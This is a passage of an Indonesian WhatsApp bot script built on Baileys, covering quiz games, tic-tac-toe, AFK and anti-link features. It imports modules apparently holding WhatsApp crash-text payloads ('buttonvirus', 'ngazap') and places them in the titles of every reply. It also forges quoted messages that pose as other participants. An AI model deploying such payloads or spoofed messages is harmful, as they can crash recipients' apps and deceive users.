/**
   * Anggayzyy
   * Script Premium Dibuat Oleh © AnggazyyModder
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const { color, bgcolor } = require('./lib/color')
const { buttonvirus } = require('./anggazyy/buttonvirus')
const { ngazap } = require('./anggazyy/ngazap')
const { jobot } = require('./anggazyy/jobot')
const turbrek = `break`
const snt = JSON.parse(fs.readFileSync('./lib/anoucement.json'));

const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

runvia = 'herokuapp.com'
namaowner = 'Anggazyy'
namabotz = 'Anggazyy Bot'

module.exports = anggazyy404 = async (anggazyy404, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await anggazyy404.decodeJid(anggazyy404.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        	const jsn = JSON.parse(fs.readFileSync('./images/database.json'))
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
     	const from = mek.key.remoteJid
        // Group
        const groupMetadata = m.isGroup ? await anggazyy404.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
	    if (!('anticall' in setting)) setting.anticall = true
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateLocation' in setting)) setting.templateLocation = false
	    } else global.db.data.settings[botNumber] = {
	    anticall: true,
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateLocation: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
     
// Public & Sel
        // Push Message To Console && Auto Read
        if (m.message) {
       anggazyy404.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgGreen(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.greenBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	//function Reply Fardan
//=================================================//
// Fake Next Projext
 const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': thumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
//=================================================//
  // Random Image Simple Menu
let picaks = ['flaming','fluming','flarun,flasmurf']
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
// Reply Kalau Mau Pake Tinggal Ubah aja m.reply Ke m.reply = replace aja semua 
/*const m.reply = (teks) => {
anggazyy404.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": `${myweb}`}}}, { quoted: m })
}   */
//=================================================//

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Anggazyy${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}


const zyy = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© Anggazyy 1981 ]️",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "50767666664@s.whatsapp.net"
}}}}

// Kontak
 const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const bacito = (jid, text, quoted = fkontak) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//GCLINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
const bacit = (jid, text, quoted = fgclink) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
// VN 
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const thejo = (jid, text, quoted = fvn) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const thejobot = (jid, text, quoted = floc) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//Troli
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const review = (jid, text, quoted = ftroli) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })
//=================================================//
//image
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
const reply = (jid, text, quoted = ctlg) => anggazyy404.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `ANGGAZYY 404ˣ_ˣ ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./anggazyy/pict.jpg'), sourceUrl: `https://youtube.com/channel/UCn0291-j7b8NVZrj92Q_meQ` }}}, { quoted })

//=================================================//
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await anggazyy404.updateProfileStatus(`${anggazyy404.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	
//EXP
		if (jsn[0].expired !== false) {
  		if (jsn[0].expired < Date.now()) {
    		jsn[0] = {
      		setting: 'tidak ada iklan',
      		expired: false
    		}
    		fs.writeFileSync('./images/database.json', JSON.stringify(jsn))
  		}
		}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await anggazyy404.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        anggazyy404.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: anggazyy404.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, anggazyy404.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        anggazyy404.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            anggazyy404.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim┣❏➥ ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await anggazyy404.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, anggazyy404.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await anggazyy404.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await anggazyy404.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    anggazyy404.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    anggazyy404.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) anggazyy404.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) anggazyy404.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) anggazyy404.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    anggazyy404.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) anggazyy404.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) anggazyy404.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    anggazyy404.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            anggazyy404.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
